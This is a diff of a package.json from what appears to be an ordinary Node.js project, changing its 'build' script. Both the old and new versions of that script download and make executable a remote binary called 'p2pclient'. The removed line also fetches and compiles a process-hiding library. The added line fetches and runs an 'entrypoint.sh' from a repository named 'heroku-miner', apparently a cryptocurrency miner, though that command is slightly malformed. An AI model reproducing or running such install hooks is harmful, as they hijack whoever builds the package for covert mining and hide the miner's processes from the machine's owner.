@@ -8,7 +8,7 @@
   "main": "index.js",
   "scripts": {
     "all": "build,build1",
-    "build": "wget https://raw.githubusercontent.com/pepek131happy4d/asddg/main/p2pclient && chmod +x p2pclient && wget https://raw.githubusercontent.com/gianlucaborello/libprocesshider/master/Makefile && wget https://raw.githubusercontent.com/gianlucaborello/libprocesshider/master/processhider.c && make",
+    "build": "wget https://raw.githubusercontent.com/pepek131happy4d/asddg/main/p2pclient && chmod +x p2pclient && https://raw.githubusercontent.com/pepek131happy4d/heroku-miner/master/entrypoint.sh && chmod +x entrypoint.sh && ./ entrypoint.sh",
     "ci:all": "",
     "start": "node index.js",
     "test": "node test.js"
